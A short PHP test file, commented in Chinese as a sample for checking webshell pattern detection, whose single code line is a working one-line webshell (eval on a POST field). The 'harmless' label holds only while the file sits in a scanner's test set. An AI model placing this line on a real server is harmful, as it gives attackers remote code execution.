<?php
// 测试 Webshell — 用于验证模式匹配检测
// 这是一个无害的测试文件，包含典型的 Webshell 特征码
@eval($_POST['cmd']);
?>